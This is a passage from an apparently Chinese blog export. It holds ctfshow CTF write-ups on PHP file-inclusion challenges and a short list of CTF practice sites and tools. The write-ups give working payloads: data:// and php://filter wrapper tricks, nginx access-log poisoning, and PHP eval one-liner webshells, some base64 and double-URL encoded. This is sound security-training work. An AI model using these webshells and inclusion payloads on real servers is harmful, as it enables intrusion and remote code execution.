<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>str_replace</strong>函数：</p>
<blockquote>
<p>语法</p>
<p>str_replace(find,replace,string,count)</p>
<p>参数 	描述 find 	必需。规定要查找的值。 replace 	必需。规定替换 find 中的值的值。 string<br>    必需。规定被搜索的字符串。 count 	可选。对替换数进行计数的变量。</p>
</blockquote>
<p>可以使用data协议对内容进行base64加密**?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[base64_encode_shell]**<br>加密内容为system(‘cat flag.php’);</p>
<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:26:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>data不能用了。<br>这里又学到一个<strong>包含日志文件getshell</strong></p>
<blockquote>
<p>中间件的日志文件会保存网站的访问记录,比如<strong>HTTP请求行</strong>,<strong>User-Agent</strong>,<strong>Referer</strong>等客户端信息<br>如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候,日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell<br>比如使用代理工具抓包,在HTTP请求中插入一句话木马,访问日志文件时会执行一句话木马,然后使用蚁剑等工具链接,从而getshell</p>
</blockquote>
<blockquote>
<p>nginx 常用的配置文件有两种： access.log 和 error.log</p>
<p>access.log 的作用是 记录用户所有的访问请求，不论状态码，包括200<br>，404,500等请求，404,500的请求并不会出现在error.log中。</p>
<p>error.log 的作用是 记录nginx<br>本身运行时的一些错误，不会记录用户访问的请求。比如记录模块错误信息日志，以及nginx配置文件的错误日志等，格式不支持自定义，可以设置级别。</p>
</blockquote>
<p>访问时添加UA头部：**<? eval($_POST[0]);?>**<br>在<strong>url&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>里，然后一句话木马链接得到flag。<br><img src="https://img-blog.csdnimg.cn/fa64c532e0954f498c7d91e961397e8a.png" alt="1"></p>
<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>参考文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:57:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('大佬别秀了');?>"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>php</code>,<code>data</code>,<code>;</code>,<code>.</code>,都被过滤了，并且输出的内容会进行url解码，因此我们要对参数进行2次url编码。<br>可以使用filter协议<strong>写入</strong>文件<strong>a.php</strong>即<code>php://filter/write=convert.base64-decode/resource=a.php</code>但是这段内容需要进行2次url编码。也就是<code>%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30</code></p>
<blockquote>
<p>POST内容进行base-64编码。<code>content=11PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</code><br>其中PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;是”<?php eval($_POST[1]);"的base64编码。
前面的11是为了填充"<?php die('大佬别秀了');?>“<br>base64 4位4位解码，其中”<?php die('大佬别秀了');?>“解码的内容其实只有phpdie，所以需要再填充两位。<br>&#x2F;&#x2F;content&#x3D;&lt;?php eval($_POST[1]);</p>
</blockquote>
<blockquote>
<p>Base64，顾名思义，就是包括小写字母a-z、大写字母A-Z、数字0-9、符号”+”、”&#x2F;“一共64个字符的字符集</p>
</blockquote>
<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-17 02:27:25
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

 */</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤了php，filter协议不能用了，input协议也不能用，但是data协议可以。<br><code>?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw</code><br><strong>PD9waHAgZXZhbCgkX1BPU1RbMV0pOw是&lt;?php eval($_POST[1]); base64编码</strong><br><img src="https://img-blog.csdnimg.cn/fc1a66afe139471382895274c504e75d.png" alt="1"><br>执行成功。</p>
<h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>发现要下载文件，下载之后原来是mp4文件，播放到后面发现有问题，题目提示说MISC＋文件包含。那我就放入<strong>010</strong>中看看<br><img src="https://img-blog.csdnimg.cn/b100906ba2694fbe8d53b7a163903b95.png" alt="1">发现有png文件，提取出来发现源码。<br><img src="https://img-blog.csdnimg.cn/8b318b0abf324bbcb4eec8e76dfd1898.png#pic_center" alt="2">直接读取flag。<br><img src="https://img-blog.csdnimg.cn/acc29cf5ea3542709099b5f9ddbf55ce.png" alt="1"></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题网站和做题工具</title>
    <url>/2022/12/09/%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天我推荐一些学习信息安全所用的刷题平台：<br>1： Bugku : <a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a><br>2： CTFHub : <a href="https://www.ctfhub.com/#/index">https://www.ctfhub.com/#/index</a><br>3： NSSCTF : <a href="https://www.ctfer.vip/index">https://www.ctfer.vip/index</a><br>4： 攻防世界 : <a href="https://adworld.xctf.org.cn/home/index">https://adworld.xctf.org.cn/home/index</a><br>5： BUUCTF : <a href="https://buuoj.cn/">https://buuoj.cn/</a><br>6： ctfshow : <a href="https://ctf.show/">https://ctf.show/</a><br>还有一个清华大学开源软件镜像站：<a href="https://mirrors.tuna.tsinghua.edu.cn/">https://mirrors.tuna.tsinghua.edu.cn/</a>   里面有一些虚拟机的镜像文件和一些好用的工具，可以参考一下。<br>一些做ctf题时可能要用的工具：<br>1： CTF在线工具：<a href="http://www.hiencode.com/">http://www.hiencode.com/</a><br>2： 针对md5、sha1等全球通用公开的加密算法进行反向查询，通过穷举字符组合的方式，创建了明文密文对应查询数据库，创建的记录约90万亿条，占用硬盘超过500TB，查询成功率95%以上，很多复杂密文只有本站才可查询。自2006年已稳定运行十余年，国内外享有盛誉。 ：<a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br>3： 里面有各种工具   <a href="http://www.wetools.com/">微工具</a></p>
<p>4： <a href="https://phpinfo.me/domain">在线子域名查询工具</a></p>
<p>今天就到这，以后我会分享更多有用的东西。敬请期待……</p>
]]></content>
      <categories>
        <category>小工具</category>
      </categories>
      <tags>
        <tag>网站</tag>
      </tags>
  </entry>
</search>
